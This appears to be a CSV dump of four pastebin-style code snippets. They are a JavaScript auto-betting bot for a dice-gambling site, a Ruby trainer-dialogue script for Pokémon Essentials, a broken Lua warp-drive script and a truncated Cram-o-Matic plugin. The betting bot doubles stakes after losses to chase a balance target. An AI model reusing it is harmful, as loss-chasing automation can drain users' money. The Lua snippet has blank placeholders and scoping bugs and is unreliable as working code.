id,title,username,language,date,content
gYvJNVXE,dont bust snowybot,coinwalk,JavaScript,Saturday 19th of August 2023 11:37:38 PM CDT,"var kozster = parseFloat($('#pct_balance').val());
var gobbie = (kozster/144000);
var zeggar = gobbie;
var target = 150000;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var burgzie = kozster;
var bone = ((Math.floor(kozster/tens))*tens);
var razzle;
var upper = 6.9;
var lower = 2.9;
var belcom = kozster;
var joe = $($(""#me>div>.betid"")[0]).text();
var boggart = 0;
var bear = true;
var nope = 1;
 
 
 
function bolukx(){
var burgzie = $('#pct_balance').val();
if (burgzie>(tuba+(zeggar*upper))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if (burgzie<(tuba-(zeggar*lower))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if ((burgzie>=(bone+(tens*nope)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    nope = 1;
    upper = 6.9;
    lower = 2.9;
    tuba = ((Math.floor(burgzie/tens))*tens);
    bone = ((Math.floor(burgzie/tens))*tens);
}
return ((zeggar*1).toFixed(8));
}
 
function go(){
var doh = $($(""#me>div>.betid"")[0]).text();
belcom = $('#pct_balance').val();
var lol = $($(""#me.results>div>.bet"")[0]).text();
var milk = (((lol)*1).toFixed(8));
if (((milk>razzle)&&(boggart>=1)&&(doh>joe)&&(!bear))||((milk<razzle)&&(boggart>=1)&&(doh>joe)&&(!bear))){
console.log(""hacker attack"");
console.log(razzle);
console.log(milk);
return;
}
if (belcom>=target) {
console.log(""chicken dinner"");
return;
}
if ((milk==razzle)&&(boggart>=1)&&(doh>joe)&&(!bear)){
joe = parseFloat(doh);
bear = true;
}
if ((doh==joe)&&(bear)){
razzle = bolukx();
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo')[0].click();
console.log(""snowybot active"");
boggart = boggart+1;
bear = false;
clearTimeout();
}
setTimeout(() => go(), 1);
}
go();
 "
ky8nkSeK,MBD (BW),FiaPlay,Ruby,Saturday 19th of August 2023 10:57:23 PM CDT,"#-----------------------------------------------------------------------------
# Script creado por FiaPlay para Pokémon Essentials BW. Créditos si se usa
# Discord de FP Systems: https://discord.gg/ds8DWB5NSW
# Si vas reportar algún bug o preguntar algo recomiendo hacerlo en el hilo del server de PokeLiberty o en FP Systems.
#Changelog:
#     PRIMER LANZAMIENTO DE LA VERSIÓN PARA ESSENTIALS BW (BASADO EN LA 2.3)
#2.3  Cambio de nombre de las claves por otras más cortas y fáciles de recordar.
#     Añadida la posibilidad de poner un texto cuando se acaba un turno.
#     Ahora es posible definir un diáogo desde la llamada a Script.
#2.2  Ahora puedes encadenar varios textos colocándolos en una Array. (Se muestran uno detrás de otro)
#     Añadida la posibilidad de poner un texto cuando se unvía un Pokémon Shiny.
#     Añadida la posibilidad de poner un texto cuando el último Pokémon del rival tiene pocos PS.
#     Corrección de errores y refactorización.
#2.1.1 Solucionado Bug de incompatibilidad con el script de Entrenadores dinámicos.
#2.1: Añadida la posibilidad de poner un texto cuando el jugador saca un Pokémon oscuro.
#     Añadida la posibilidad de poner un texto cuando el jugador saca su último Pokémon.
#     Añadida la posibilidad de poner un texto cuando un Pokémon recibe un golpe Super-Efectivo.
#     Añadida la posibilidad de poner un texto cuando un Pokémon recibe un golpe Poco-Efectivo.
#     Añadida la posibilidad de poner un texto cuando un Pokémon recibe un Golpe Crítico.
#     Solucionada incompatibilidad con mi script de Megaevolución de Pokémon Salvaje (Coloque este script debajo de ese).
#     Compatibilidad con este sistema de Dynamax: https://www.pokecommunity.com/showthread.php?t=426770
#     Corrección de errores.
#2.0: Nueva forma de setear los textos (No pienso volver a cambiarla).
#     Eliminada la necesidad de usar variables de evento.
#     Ahora el rival puede decir algo cuando el jugador usa una de las mecánicas de batalla (Megaevolución,Ultraexplosión,etc...)
#     Ahora el rival puede decir algo cuando este saca un Pokémon en específico. 
#     Añadida la posibilidad de reproducir un SE junto con los textos.
#1.4: Eliminados los buffers de texto (Para ser sincero son innecesarios e incompatibles con los cambios de esta versión)
#     Ahora si un diálogo no está definido se omite. (En anteriores versiones se mostraba un texto en blanco.)
#     Ahora los textos se activan desde el mismo método que se setean. Se desactivan automáticamente al terminar la batalla.
#     Compatibilidad con el script de Movimientos Z.
#1.3: Añadida la posiblidad de usar buffers de texto.
#     Añadido un método para revisar si hay una versión actualizada del script.
#1.2: Añadida la posiblidad de usar varias músicas de último Pokémon.
#     Añadida la posibilidad de poner un texto cuando el rival usa un objeto.
#     Añadida la posibilidad de poner un texto cuando el rival saca un pokémon oscuro.
#     Añadida la posibilidad de poner un texto cuando capturas pokémon oscuro del rival.
#     Correción de errores (Incluido uno que viene por defecto en essentials).
#1.1: Añadido un par de métodos para setear textos más facilmente.
#1.0: Versión inicial.
#-----------------------------------------------------------------------------
# Demostración https://youtu.be/lHCQdq62Xh8 (2.0)
#-----------------------------------------------------------------------------
# Modo de uso:
#Para activar los textos solo setealos usando el método fpTTS_set()
#Entre paréntesis va un Symbol que es el nombre de la constante con los datos.
=begin Para un ejemplo práctico pegue una de las siguientes líneas en una llamada a script
fpTTS_set(:TEST_BW)
fpTTS_set(:CHAMPION_BLUE)
fpTTS_set(:LEADER_CHEREN)
=end
=begin Si lo que quiere es definirlo desde una llamada a Script (Ni idea de por qué) podría:
dialogue={
""mega"" => ""¡Voy con todo!"",
""super_effective_move(player)"" => ""Sabes lo que haces muchacho.""
}
fpTTS_set(dialogue)
=end
#-----------------------------------------------------------------------------
# FAQ:
#*¿Para cuando videotutorial?
# Para cuando tenga ganas.
#
#*Antes de iniciar cada batalla recibo unas alertas de que uso una versión no compatible.
# Estás en una versión que no es la Essentials BW. Si estás en esta versión y recibes el error avísame por Discord.
#
#*¿Es compatible con combates dobles?
# No deberías recibir mensajes de error, pero no prometo nada.
#
#*He recibido x error y me parece que es este script.
# Avísame por el Discord. (Solo si de verdad crees que fue este script)
#-----------------------------------------------------------------------------
# Estas son las opciones cámbialas a como necesites.
#-----------------------------------------------------------------------------
TEXTSE = """" #SE que se reproducirá al aparecer el sprite del entrenador
module MBD_Data

#-----------------------------------------------------------------------------
# En la siguiente constante están configurados todos los diálogos posibles. 
#-----------------------------------------------------------------------------
TEST_BW={
  ""last_bgm"" => ""Boss02"",
  ""last"" => [""¡Ho, no. Es mi último Pokémon!"",""Pero todavía puedo luchar""],
  ""last(player)"" => ""Te veo en un buen apuro."",
  ""end_turn"" => [0,[""¿Qué haces?"",""Esto solo está empezando""]],
  ""lowhp_last"" => [""!No puede ser¡"",""¡ESTOY AL LÍMITE!""],
  ""shiny"" => [""¿Cómo ves mi brillo?"",""¿Es mucho para tí?""],
  ""shiny(player)"" => ""¿De donde sacaste eso?"",
  ""mega"" => ""¡Qué importa solo debo usar la poderosa energía ancestral!"",
  ""mega(player)"" => ""No podía esperar menos de tí."",
  ""send"" => [:KYOGRE,""Tan solo admira mi Leviatán"",:GROUDON,""Un poderoso Reptil Ígneo.""],
  ""item"" => ""No puedo dejar que esto termine tan rápido."",
  ""shadow"" => ""No es inhumano , solo es un viejo truco."",
  ""shadow(player)"" => ""Me sorprende verte usando un poder como ese."",
  ""caught_poke"" => ""¡Cómo te atreves!"",
  ""critical_move"" => ""Tengo al universo de mi lado."",
  ""critical_move(player)"" => ""Necesitarás más que suerte para vencerme."",
  ""low_effective_move"" => ""Debo pensar mejor lo que hago."",
  ""low_effective_move(player)"" => [""Creí tenías más experiencia."",""No puedes ganarme cometiendo errores.""],
  ""super_effective_move"" => ""Cometiste un greve error al meterte conmigo."",
  ""super_effective_move(player)"" => ""Nada mal niño.""
}

#-----------------------------------------------------------------------------
# Esto sería para la batalla contra el campeón por defecto.
#-----------------------------------------------------------------------------
CHAMPION_BLUE={
  ""last"" => ""No puedo dejar que me derrotes ahora."",
  ""last(player)"" => ""Luego de tantos combtes por fin podré derotaré."",
  ""end_turn"" => [0,[""Este combate solo está empezando."", ""Todavía no te confies.""]],
  ""lowhp_last"" => ""Mientras tenga uno mi poder es infinito."",
  ""send"" => [:BLASTOISE,""Espero que sepas nadar."",:CHARIZARD,""Prepárate para pasar calor.""],
  ""item"" => ""Usaré todo lo que tenga a mano para vencerte."",
  ""shadow(player)"" => [""Veo que caiste en esa tentación."",""No mereces nisiquiera retarme.""],
  ""critical_move(player)"" => ""Solo con eso no me ganarás."",
  ""low_effective_move(player)"" => ""¿En qué estabas pensando?"",
  ""super_effective_move"" => ""Aprendí mucho con mi Pokedex.""
}
#-----------------------------------------------------------------------------
# Esto sería para la batalla contra Cheren.
#-----------------------------------------------------------------------------
LEADER_CHEREN={
  ""last_bgm"" => ""elite"",
  ""last"" => ""Bien, pero si quieres la Medalla Base tendrás que luchar un poco más."",
  ""end_turn"" => [0,[""¿Qué haces?"",""Esto solo está empezando.""]],
  ""shiny(player)"" => [""Has buscado oro."",""Pero su belleza no afecta su fuerza.""],
  ""send"" => [:PATRAT,""Veamos de que estás hecho... Aspirante.""],
  ""mega(player)"" => ""Me parece muy temprano para que uses algo así."",
  ""item"" => ""No puedo rendirme tan rápido."",
  ""super_effective_move(player)"" => ""Jamás podrás acabar con mi determinación.""
}
end
 
#--------------------------------------------------------------------------------
# A patir de aquí no toques nada a no ser que sepas bien lo que estás haciendo.
#--------------------------------------------------------------------------------
 
class PokeBattle_Battle

#--------------------------------------------------------------------------------
# Método que muestra los textos
#--------------------------------------------------------------------------------
  def fpShowText(key="""",mbu="""",dtext=nil)
    return if !@opponent
    return if key==""""
    return if !$tts[key]
    text = dtext ? dtext : $tts[key]
    return if $mbu.include?(mbu)
    @scene.pbShowOpponent(0,true)
    pbSEPlay(TEXTSE) if TEXTSE && TEXTSE!=""""
    if text.is_a?(Array)
	    for i in text
          pbDisplayPaused(i)
	    end
    else
	  pbDisplayPaused(text)
    end
    @scene.pbHideOpponent
    PBDebug.log(""Díalogo Mostrado: #{text}"")
    $mbu.push(mbu) if mbu!=""""
  end
    
#--------------------------------------------------------------------------------
#Para el último Pokémon , los Pokémon específicos y los Pokémon Oscuros del jugador.
#--------------------------------------------------------------------------------
  def pbSendOut(index,pokemon)
    pbSetSeen(pokemon)
    @peer.pbOnEnteringBattle(self,pokemon)
    if pbIsOpposing?(index)
      @scene.pbTrainerSendOut(index,pokemon)
      if (pbPokemonCount(@party2)>=2 || $tts[""last""] == nil) && $tts[""send""]
        for i in 0...$tts[""send""].length/2
          name=pokemon.name
          if isConst?(pokemon.species,PBSpecies,$tts[""send""][i*2]) && !$mbu.include?(name)
            fpShowText(""send"",""opp#{name}"",$tts[""send""][i*2+1])
          end
        end
      end
      pbBGMPlay($tts[""last_bgm""],100,100) if $tts[""last_bgm""] && pbPokemonCount(@party2)==1
      fpShowText(""last"") if pbPokemonCount(@party2)==1
    else
      @scene.pbSendOut(index,pokemon)
      fpShowText(""last(player)"") if pbPokemonCount(@party1)==1
	  @battle.fpShowText(""shadow(player)"",""shadow(player)"") if pokemon.isShadow?
    end
    @scene.pbResetMoveIndex(index)
  end

#--------------------------------------------------------------------------------
#Para la Megaevolución
#--------------------------------------------------------------------------------
  def pbMegaEvolve(index)
    return if !@battlers[index] || !@battlers[index].pokemon
    return if !(@battlers[index].hasMega? rescue false)
    return if (@battlers[index].isMega? rescue true)
    ownername=pbGetOwner(index).fullname
    ownername=pbGetOwner(index).name if pbBelongsToPlayer?(index)
    fpShowText(""mega"") if pbIsOpposing?(index)
    pbDisplay(_INTL(""¡La {2} de {1} está reaccionando al Mega Aro de {3}!"",
           @battlers[index].pbThis,PBItems.getName(@battlers[index].item),
         ownername))
    pbCommonAnimation(""MegaEvolution"",@battlers[index],nil)
    @battlers[index].pokemon.makeMega
    @battlers[index].form=@battlers[index].pokemon.form
    @battlers[index].pbUpdate(true)
    @scene.pbChangePokemon(@battlers[index],@battlers[index].pokemon)
    meganame=(@battlers[index].pokemon.megaName rescue nil)
    if !meganame || meganame==""""
      meganame=_INTL(""Mega {1}"",PBSpecies.getName(@battlers[index].pokemon.species))
    end
    pbDisplay(_INTL(""¡{1} ha Mega Evolucionado en {2}!"",@battlers[index].pbThis,meganame))
    fpShowText(""mega(player)"") if pbBelongsToPlayer?(index)
    PBDebug.log(""[Mega Evolución] #{@battlers[index].pbThis} ha Mega Evolucionado"")
    side=(pbIsOpposing?(index)) ? 1 : 0
    owner=pbGetOwnerIndex(index)
    @megaEvolution[side][owner]=-2
  end
  
#--------------------------------------------------------------------------------
# Para los objetos
#--------------------------------------------------------------------------------
  def pbEnemyUseItem(item,battler)
    return 0 if !@internalbattle
    items=pbGetOwnerItems(battler.index)
    return if !items
    opponent=pbGetOwner(battler.index)
    for i in 0...items.length
      if items[i]==item
        items.delete_at(i)
        break
      end
    end
	fpShowText(""item"",""item"")
    itemname=PBItems.getName(item)
    pbDisplayBrief(_INTL(""{1} used the\r\n{2}!"",opponent.fullname,itemname))
    PBDebug.log(""[Opponent used #{itemname}]"")
    if isConst?(item,PBItems,:POTION)
      battler.pbRecoverHP(20,true)
      pbDisplay(_INTL(""{1}'s HP was restored."",battler.pbThis))
    elsif isConst?(item,PBItems,:SUPERPOTION)
      battler.pbRecoverHP(50,true)
      pbDisplay(_INTL(""{1}'s HP was restored."",battler.pbThis))
    elsif isConst?(item,PBItems,:HYPERPOTION)
      battler.pbRecoverHP(200,true)
      pbDisplay(_INTL(""{1}'s HP was restored."",battler.pbThis))
    elsif isConst?(item,PBItems,:MAXPOTION)
      battler.pbRecoverHP(battler.totalhp-battler.hp,true)
      pbDisplay(_INTL(""{1}'s HP was restored."",battler.pbThis))
    elsif isConst?(item,PBItems,:FULLRESTORE)
      fullhp=(battler.hp==battler.totalhp)
      battler.pbRecoverHP(battler.totalhp-battler.hp,true)
      battler.status=0; battler.statusCount=0
      battler.effects[PBEffects::Confusion]=0
      if fullhp
        pbDisplay(_INTL(""{1} became healthy!"",battler.pbThis))
      else
        pbDisplay(_INTL(""{1}'s HP was restored."",battler.pbThis))
      end
    elsif isConst?(item,PBItems,:FULLHEAL)
      battler.status=0; battler.statusCount=0
      battler.effects[PBEffects::Confusion]=0
      pbDisplay(_INTL(""{1} became healthy!"",battler.pbThis))
    elsif isConst?(item,PBItems,:XATTACK)
      if battler.pbCanIncreaseStatStage?(PBStats::ATTACK)
        battler.pbIncreaseStat(PBStats::ATTACK,1,true)
      end
    elsif isConst?(item,PBItems,:XDEFEND)
      if battler.pbCanIncreaseStatStage?(PBStats::DEFENSE)
        battler.pbIncreaseStat(PBStats::DEFENSE,1,true)
      end
    elsif isConst?(item,PBItems,:XSPEED)
      if battler.pbCanIncreaseStatStage?(PBStats::SPEED)
        battler.pbIncreaseStat(PBStats::SPEED,1,true)
      end
    elsif isConst?(item,PBItems,:XSPECIAL)
      if battler.pbCanIncreaseStatStage?(PBStats::SPATK)
        battler.pbIncreaseStat(PBStats::SPATK,1,true)
      end
    elsif isConst?(item,PBItems,:XSPDEF)
      if battler.pbCanIncreaseStatStage?(PBStats::SPDEF)
        battler.pbIncreaseStat(PBStats::SPDEF,1,true)
      end
    elsif isConst?(item,PBItems,:XACCURACY)
      if battler.pbCanIncreaseStatStage?(PBStats::ACCURACY)
        battler.pbIncreaseStat(PBStats::ACCURACY,1,true)
      end
    end
  end
  
#--------------------------------------------------------------------------------
# Para los finales de turno y pocos PS en el último Pokémon
#--------------------------------------------------------------------------------
  alias pbEndOfRoundPhase_fp pbEndOfRoundPhase
  def pbEndOfRoundPhase
      fpShowText(""lowhp_last"") if pbPokemonCount(@party2)==1 && @battlers[1].totalhp/2 >= @battlers[1].hp
      for i in 0...$tts[""end_turn""].length/2
      if @turncount==$tts[""end_turn""][i*2]
        fpShowText(""end_turn"","""",$tts[""end_turn""][i*2+1])
      end
    end
    pbEndOfRoundPhase_fp
  end
end

#--------------------------------------------------------------------------------
# Para los golpes Super-Efectivos, Poco-Efectivos y Críticos
#--------------------------------------------------------------------------------
class PokeBattle_Move
    def pbEffectMessages(attacker,opponent,ignoretype=false)
    if opponent.damagestate.critical
      @battle.pbDisplay(_INTL(""A critical hit!""))
	  @battle.fpShowText(""critical_move"",""critical_move"") if @battle.pbIsOpposing?(attacker.index)
      @battle.fpShowText(""critical_move(player)"",""critical_move(player)"") if @battle.pbBelongsToPlayer?(attacker.index)
    end
    if !pbIsMultiHit
      if opponent.damagestate.typemod>4
        @battle.pbDisplay(_INTL(""It's super effective!""))
		@battle.fpShowText(""super_effective_move"",""super_effective_move"") if @battle.pbIsOpposing?(attacker.index)
        @battle.fpShowText(""super_effective_move(player)"",""super_effective_move(player)"") if @battle.pbBelongsToPlayer?(attacker.index)
      elsif opponent.damagestate.typemod>=1 && opponent.damagestate.typemod<4
        @battle.pbDisplay(_INTL(""It's not very effective...""))
		@battle.fpShowText(""low_effective_move"",""low_effective_move"") if @battle.pbIsOpposing?(attacker.index)
        @battle.fpShowText(""low_effective_move(player)"",""low_effective_move(player)"") if @battle.pbBelongsToPlayer?(attacker.index)
      end
    end
    if opponent.damagestate.endured
      @battle.pbDisplay(_INTL(""{1} endured the hit!"",opponent.pbThis))
    elsif opponent.damagestate.sturdy
      @battle.pbDisplay(_INTL(""{1} hung on with Sturdy!"",opponent.pbThis))
    elsif opponent.damagestate.focussashused
      @battle.pbDisplay(_INTL(""{1} hung on using its Focus Sash!"",opponent.pbThis))
    elsif opponent.damagestate.focusbandused
      @battle.pbDisplay(_INTL(""{1} hung on using its Focus Band!"",opponent.pbThis))
    end
  end
end
#--------------------------------------------------------------------------------
# Para los Pokémon Shiny y Oscuros
#--------------------------------------------------------------------------------
class PokeBattle_Scene
  alias pbCommonAnimation_fp pbCommonAnimation
  def pbCommonAnimation(*args)
    pbCommonAnimation_fp(*args)
	name=args[0]
    case name
    when ""Shadow""
      @battle.fpShowText(""shadow"",""shadow"") if @battle.pbIsOpposing?(attacker.index)
    when ""Shiny""
      @battle.fpShowText(""shiny"",""shiny"") if @battle.pbIsOpposing?(attacker.index)
      @battle.fpShowText(""shiny(player)"",""shiny(player)"") if @battle.pbBelongsToPlayer?(attacker.index)
    end
  end
end

#--------------------------------------------------------------------------------
#Para los Pokémon Oscuros capturados
#--------------------------------------------------------------------------------
module PokeBattle_BattleCommon
  alias pbStorePokemon_fp pbStorePokemon
  def pbStorePokemon(poke)
    fpShowText(""caught_poke"",""shadowcaught"")
    pbStorePokemon_fp(poke)
  end
end 

#--------------------------------------------------------------------------------
#Fix con las HP Bars
#--------------------------------------------------------------------------------
class PokeBattle_Scene
    def pbShowOpponent(index,fp=false)
    if @battle.opponent
      if @battle.opponent.is_a?(Array)
        trainerfile=pbTrainerSpriteFile(@battle.opponent[index].trainertype)
      else
        trainerfile=pbTrainerSpriteFile(@battle.opponent.trainertype)
      end
    else
      trainerfile=""Graphics/Characters/trfront""
    end
    
    unless fp
      @sprites[""battlebox0""].visible=false if @sprites[""battlebox0""]
      @sprites[""battlebox1""].visible=false if @sprites[""battlebox1""]
      @sprites[""battlebox2""].visible=false if @sprites[""battlebox2""]
      @sprites[""battlebox3""].visible=false if @sprites[""battlebox3""]
    end
    
    @sprites[""opponent""]=DynamicTrainerSprite.new(false,-1,@viewport)
    @sprites[""opponent""].setTrainerBitmap(trainerfile)
    @sprites[""opponent""].toLastFrame
    @sprites[""opponent""].lock
    @sprites[""opponent""].z=16
    @sprites[""opponent""].x=@sprites[""enemybase""].x+120
    @sprites[""opponent""].y=@sprites[""enemybase""].y+30
    @sprites[""opponent""].opacity=0
    20.times do
      moveEntireScene(-3,-2)
      @sprites[""opponent""].opacity+=12.8
      @sprites[""opponent""].x-=4
      @sprites[""opponent""].y-=2
      pbGraphicsUpdate
      pbInputUpdate
    end
  end
end
#--------------------------------------------------------------------------------
# Control de Variables
#--------------------------------------------------------------------------------
Events.onStartBattle+=proc {|sender,e|
    $mbu=[]
    $tts={} if !$tts
    #Comprueba que estés en una versión compatible
    unless  defined?(SCREENDUALHEIGHT)
      print ""Usted está utilizando el sistema de Diálogos de entrenador durante la batalla de FiaPlay (BW).""
      print ""En una versión que no parece ser Pokémon Essentials BW.""
      print ""Por favor elimínelo para evitar inconvenientes.""
    end
}
Events.onEndBattle+=proc{
  $tts={}; $mbu=[]
}

#--------------------------------------------------------------------------------
# Método que setea los textos
#--------------------------------------------------------------------------------
def fpTTS_set(param)
    if param.is_a?(Symbol)
        if hasConst?(MBD_Data,param)
            $tts=getConst(MBD_Data,param)
        else
            raise ""Constante de Diálogos no definida.""
        end
    elsif param.is_a?(Hash)
        $tts=param
    else
        raise ""Parámetro incorrecto, se esperaba un Hash o Symbol.""
    end
end"
9Ut86QZh,auto drive,codfish890,Lua,Saturday 19th of August 2023 10:48:13 PM CDT,"local core = peripheral.find(""warpdriveShipCore"")
local targetx = -
local targety = -
local targetz = -
sleep(5)
r = redstone.getAnalogInput(""front"")
core.enable(false)
core.command(""manual"", false)
local adsfasgasd,max = core.getMaxJumpDistance()
local currentx, currenty, currentz = core.getLocalPosition()
local dx = math.sqrt((currentx - targetx)^2)
local dy = math.sqrt((currenty - targety)^2)
local dz = math.sqrt((currentz - targetz)^2)
do
 if r >= 1 then
  print(""stop"")
  exit()
  end
 if currentx == targetx then
  local mx = 0
  end
 if dx >= max then
  local mx = max
  end
 if dx <= max then
  local mx = dx
  end
 print(mx)
 if currenty == targety then
  local my = 0
  end
 if dy >= max then
  local my = max
  end
 if dy <= max then
  local my = dy
  end
 if currentz == targetz then
  local mz = 0
  end
 if dz >= max then
  local mz = max
  end
 if dz <= max then
  local mz = dz
  end


print(mx)
print(my)
print(mz)
core.movement(mx,my,mz)
core.enable(true)
core.command(""manual"", true)
end"
SYpDn8zq,Cram-o-Matic [v20/v21],Vendily,Ruby,Saturday 19th of August 2023 10:06:55 PM CDT,"#===============================================================================
# Cram-o-Matic - By Vendily and KyureJL [v20/v21]
#===============================================================================
# This script adds in the Cram-o-Matic, the combinational machine from the SwSh
#  Isle of Armor DLC.
#===============================================================================
# The you only need to call pbCramOMatic in an event, and the script will allow
#  you to pick 4 items to convert. Canceling early returns the items.
#  Only items with the CramOMatic_TYPE_VALUE flag can be chosen.
#  TYPE is one of the CRAMOMATIC_TYPERECIPIES keys.
#  VALUE is the numerical point value of this item when combined
#
# There are a few hard coded recipies, and the generic type based recipies
#  are defined in CRAMOMATIC_TYPERECIPIES
#
# CRAMOMATIC_TYPERECIPIES contains entries where the key is the type (doesn't 
#  have to be a type) and the value is an array of item symbols. The array has to 
#  be the same length as CRAMOMATIC_RATIO. You can set a slot as an array of
#  item symbols to pick one at random.
#===============================================================================
PluginManager.register({
  :name    => ""Cram-o-Matic"",
  :version => ""2.0"",
  :link    => ""https://reliccastle.com/resources/449/"",
  :credits => [""Vendily"",""KyureJL""]
})

CRAMOMATIC_TYPERECIPIES={
  :BUG=>[:TR60,:TR18,:BRIGHTPOWDER,:WISHINGPIECE,:SILVERPOWDER,:BALMMUSHROOM,:TR61,:SHEDSHELL,:PEARLSTRING,:TR96,:COMETSHARD,:TR28,:RARECANDY,:BOTTLECAP,:PPUP],
  :DARK=>[:TR37,:WIDELENS,:TR68,:WISHINGPIECE,:STARPIECE,:BALMMUSHROOM,:TR81,:SCOPELENS,:TR95,:TR58,:TR32,:TR93,:RARECANDY,:BOTTLECAP,:PPUP],
  :DRAGON=>[:TR47,:DRAGONFANG,:BIGMUSHROOM,:WISHINGPIECE,:STARPIECE,:BALMMUSHROOM,:DRAGONSCALE,:LIFEORB,:TR62,:KINGSROCK,:TR51,:TR24,:RARECANDY,:BOTTLECAP,:PPUP],
  :ELECTRIC=>[:ELECTRICSEED,:TR80,:CELLBATTERY,:WISHINGPIECE,:MAGNET,:TR86,:UPGRADE,:LIGHTBALL,:PEARLSTRING,:DUBIOUSDISC,:TR08,:TR09,:RARECANDY,:BOTTLECAP,:PPUP],
  :FAIRY=>[:STARDUST,:MISTYSEED,:BIGMUSHROOM,:WISHINGPIECE,:SACHET,:ROOMSERVICE,:WHIPPEDDREAM,:DESTINYKNOT,
    [:BERRYSWEET,:CLOVERSWEET,:FLOWERSWEET,:LOVESWEET,:STRAWBERRYSWEET],:TR92,
    [:RIBBONSWEET,:STARSWEET,:STRAWBERRYSWEET],:TR90,:RARECANDY,:BOTTLECAP,:PPUP],
  :FIGHTING=>[:TR07,:TR56,:MUSCLEBAND,:WISHINGPIECE,:TR48,:TR21,:MACHOBRACE,:TM00,:EXPERTBELT,:TR64,:TR39,:TR53,:RARECANDY,:BOTTLECAP,:PPUP],
  :FIRE=>[:TR88,:FLAMEORB,:TR41,:WISHINGPIECE,:TR02,:BALMMUSHROOM,:TR36,:REDCARD,:TR15,:CHARCOAL,:TR55,:TR43,:RARECANDY,:BOTTLECAP,:PPUP],
  :FLYING=>[:PRETTYFEATHER,:SHARPBEAK,:BIGMUSHROOM,:WISHINGPIECE,:AIRBALLOON,:BLUNDERPOLICY,:GRIPCLAW,:AIRBALLOONN,:WEAKNESSPOLICY,:TR89,:COMETSHARD,:TR66,:RARECANDY,:BOTTLECAP,:PPUP],
  :GHOST=>[:ODDINCENSE,:ADRENALINEORB,:RINGTARGET,:WISHINGPIECE,:STARPIECE,:BALMMUSHROOM,:CLEANSETAG,:SPELLTAG,:CRACKEDPOT,:REAPERCLOTH,:COMETSHARD,:TR33,:RARECANDY,:BOTTLECAP,:PPUP],
  :GRASS=>[:GRASSYSEED,:TR59,:WHITEHERB,:WISHINGPIECE,:TR77,:TR50,:TR65,:ABSORBBULB,:PEARLSTRING,:TR72,:COMETSHARD,:TR71,:RARECANDY,:BOTTLECAP,:PPUP],
  :GROUND=>[:STARDUST,:TR23,:BIGMUSHROOM,:WISHINGPIECE,:LIGHTCLAY,:TR87,:TR67,:TERRAINEXTENDER,:PEARLSTRING,:TR94,:COMETSHARD,:TR10,:RARECANDY,:BOTTLECAP,:PPUP],
  :ICE=>[:SNOWBALL,:ICYROCK,:NEVERMELTICE,:WISHINGPIECE,:STARPIECE,:BALMMUSHROOM,:RAZORCLAW,:SNOWBALL,:PEARLSTRING,:TR05,:COMETSHARD,:TR06,:RARECANDY,:BOTTLECAP,:PPUP],
  :NORMAL=>[:TR85,:TR14,:TR26,:TR13,:TR27,:TR35,:TR01,:TR19,:TR29,:TR30,:TR20,:TR00,:TR42,:BOTTLECAP,:PPUP],
  :POISON=>[:BLACKSLUDGE,:TOXICORB,:TR91,:WISHINGPIECE,:TR54,:SMOKEBALL,:TR57,:QUICKPOWDER,:POISONBARB,:TR22,:TR78,:TR73,:RARECANDY,:BOTTLECAP,:PPUP],
  :PSYCHIC=>[:TR12,:TR34,:TR40,:TR82,:TR44,:TR83,:TR25,:TR69,:TR17,:TR38,:TR49,:TR97,:TR11,:BOTTLECAP,:PPUP],
  :ROCK=>[:FLOATSTONE,:OVALSTONE,:HARDSTONE,:WISHINGPIECE,:EVERSTONE,:PROTECTOR,:ROCKYHELMET,:TR63,:WISHINGPIECE,:EVIOLITE,:TR76,:TR75,:RARECANDY,:BOTTLECAP,:PPUP],
  :STEEL=>[:TR31,:TR46,:METALPOWDER,:WISHINGPIECE,:UTILITYUMBRELLA,:METALCOAT,:TR52,:ASSAULTVEST,:TR79,:AMULETCOIN,:TR70,:TR64,:RARECANDY,:BOTTLECAP,:PPUP],
  :WATER=>[:SEAINCENSE,:TR04,:SHELLBELL,:WISHINGPIECE,:TR16,:TR98,:PRISMSCALE,:MYSTICWATER,:PEARLSTRING,:TR45,:TR84,:TR03,:RARECANDY,:BOTTLECAP,:PPUP],
}
CRAMOMATIC_RATIO=[20,30,40,50,60,70,80,90,100,110,120,130,140,150,-1]

def pbCramOMatic
  if Kernel.pbConfirmMessage(_INTL(""Combine Items?""))
    Kernel.pbMessage(_INTL(""Select the items to be combined.\\1""))
    items=[]
    pbFadeOutIn(99999){
      4.times do
        craft=nil
        scene = PokemonBag_Scene.new
        screen = PokemonBagScreen.new(scene,$bag)
        craft = screen.pbChooseItemScreen(Proc.new{|item| GameData::Item.get(item).flags.any? { |f| f[/^CramOMatic_/i] } })
        break unless craft
        items.push(craft)
        $bag.remove(craft)
      end
    }
    if items.length<4
      items.each{|item| $bag.add(item)}
      return
    end
    qty=1
    if items.all?{|item| GameData::Item.get(item).is_apricorn?}
      ratio=[247,247,247,247,10,1,1]
      craft=items[rand(items.length)]
      case craft
      when :BLACKAPRICORN
        table=[:POKEBALL,:GREATBALL,:DUSKBALL,:LUXURYBALL,:HEAVYBALL,:SAFARIBALL,:SPORTBALL]
      when :BLUEAPRICORN
        table=[:POKEBALL,:GREATBALL,:DIVEBALL,:NETBALL,:LUREBALL,:SAFARIBALL,:SPORTBALL]
      when :GREENAPRICORN
        table=[:POKEBALL,:GREATBALL,:ULTRABALL,:NESTBALL,:FRIENDBALL,:SAFARIBALL,:SPORTBALL]
      when :PINKAPRICORN
        table=[:POKEBALL,:GREATBALL,:ULTRABALL,:HEALBALL,:LOVEBALL,:SAFARIBALL,:SPORTBALL]
      when :REDAPRICORN
        table=[:POKEBALL,:GREATBALL,:ULTRABALL,:REPEATBALL,:LEVELBALL,:SAFARIBALL,:SPORTBALL]
      when :WHITEAPRICORN
        table=[:POKEBALL,:GREATBALL,:PREMIERBALL,:TIMERBALL,:FASTBALL,:SAFARIBALL,:SPORTBALL]
      when :YELLOWAPRICORN
        table=[:POKEBALL,:GREATBALL,:ULTRABALL,:QUICKBALL,:MOONBALL,:SAFARIBALL,:SPORTBALL]
      end
      total=0
      ratio.each{|r| total+=r}
      num=rand(total)
      cumtotal=0
      ball=0
      table.length.times do |i|
        cumtotal+=ratio[i]
        if num<cumtotal
          ball=i
          break
        end
      end
